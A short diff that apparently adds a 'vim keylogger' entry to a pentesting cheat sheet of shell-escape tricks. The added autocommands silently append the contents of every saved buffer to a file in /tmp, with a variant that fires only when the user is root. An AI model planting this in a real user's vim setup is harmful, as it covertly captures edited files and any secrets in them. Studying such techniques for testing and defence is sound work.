@@ -17,5 +17,11 @@ sudo -E
 # run shell from vim
 :shell
 
+# vim keylogger
+:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
+
+:if $USER == "root"
+:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
+:endif
 
 
